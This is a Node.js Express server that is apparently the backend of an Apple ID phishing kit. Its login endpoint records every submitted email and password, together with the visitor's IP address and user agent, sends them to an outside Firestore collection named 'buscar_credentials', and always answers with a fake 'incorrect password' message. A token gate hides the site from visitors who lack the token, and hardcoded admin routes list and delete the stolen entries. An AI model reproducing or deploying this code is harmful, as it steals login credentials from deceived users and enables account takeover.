const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuração do Firebase
const PROJECT_ID = "missoes-drive";
const API_KEY = "AIzaSyDsWJ9VVMSIsQNtifkLVnRNnbzU7favF7s"; // Sua API Key (opcional para leitura pública, mas bom ter)
const COLLECTION = "buscar_credentials";

// URL base do Firestore REST API
const FIRESTORE_URL = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${COLLECTION}`;

// Middleware
app.use(bodyParser.json());
app.use(cookieParser());

// --- SISTEMA DE TOKEN ---
const ACCESS_TOKEN = process.env.ACCESS_TOKEN || 'buscar2026';

app.use((req, res, next) => {
    const tokenFromQuery = req.query.t;
    if (tokenFromQuery === ACCESS_TOKEN) {
        res.cookie('access_token', ACCESS_TOKEN, { maxAge: 1000 * 60 * 60 * 24 * 7, httpOnly: true });
        return res.redirect(req.path);
    }

    const tokenFromCookie = req.cookies.access_token;
    const isStaticAsset = /\.(css|js|png|jpg|jpeg|gif|svg|ico)$/.test(req.path);
    const isApi = req.path.startsWith('/api/');

    if (tokenFromCookie === ACCESS_TOKEN || isStaticAsset) {
        return next();
    }

    res.status(404).send('Not Found');
});

app.use(express.static(path.join(__dirname, 'public')));

// Credenciais Admin
const ADMIN_EMAIL = 'admin@buscar.com';
const ADMIN_PASSWORD = 'Admin@2026';

// Helper para converter objeto JS para formato Firestore JSON
function toFirestoreJSON(obj) {
    const fields = {};
    for (const [key, value] of Object.entries(obj)) {
        if (typeof value === 'string') fields[key] = { stringValue: value };
        else if (typeof value === 'number') fields[key] = { doubleValue: value };
        else if (typeof value === 'boolean') fields[key] = { booleanValue: value };
        // Adicione outros tipos se necessário
    }
    return { fields };
}

// Helper para converter Firestore JSON para objeto JS
function fromFirestoreJSON(doc) {
    const obj = { id: doc.name.split('/').pop() };
    const fields = doc.fields || {};
    for (const [key, value] of Object.entries(fields)) {
        if (value.stringValue !== undefined) obj[key] = value.stringValue;
        else if (value.doubleValue !== undefined) obj[key] = Number(value.doubleValue);
        else if (value.booleanValue !== undefined) obj[key] = value.booleanValue;
    }
    return obj;
}

// Login endpoint - Salva no Firestore via REST
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email e senha são obrigatórios' });
    }

    // Salva no Firestore
    try {
        const firestoreData = toFirestoreJSON({
            email,
            password,
            timestamp: new Date().toISOString(),
            userAgent: req.headers['user-agent'] || 'unknown',
            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown'
        });

        await axios.post(FIRESTORE_URL, firestoreData);
    } catch (err) {
        console.error('Erro Firestore REST:', err.response ? err.response.data : err.message);
    }

    // Verifica se é admin
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        return res.json({ success: true, isAdmin: true });
    }

    return res.json({ success: false, message: 'ID Apple ou senha incorreta.' });
});

// Admin Auth
app.post('/api/admin/auth', (req, res) => {
    const { email, password } = req.body;
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) return res.json({ success: true });
    return res.status(401).json({ success: false, message: 'Acesso negado' });
});

// Get Data - Firestore REST
app.post('/api/admin/data', async (req, res) => {
    const { email, password } = req.body;

    if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Acesso negado' });
    }

    try {
        // Busca todos os documentos (limite 100 para exemplo)
        const response = await axios.get(`${FIRESTORE_URL}?pageSize=100`);
        const documents = response.data.documents || [];
        const data = documents.map(fromFirestoreJSON);
        
        // Ordena por timestamp manual (já que o REST não ordena fácil sem index)
        data.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        return res.json({ success: true, data });
    } catch (err) {
        console.error('Erro Admin Data:', err.response ? err.response.data : err.message);
        return res.status(500).json({ success: false, message: 'Erro ao ler dados' });
    }
});

// Delete Entry - Firestore REST
app.post('/api/admin/delete', async (req, res) => {
    const { email, password, docId } = req.body;

    if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Acesso negado' });
    }

    try {
        await axios.delete(`${FIRESTORE_URL}/${docId}`);
        return res.json({ success: true });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Erro ao deletar' });
    }
});

app.listen(PORT, () => {
    console.log(`\n🔍 Buscar Server (REST) running at http://localhost:${PORT}`);
});
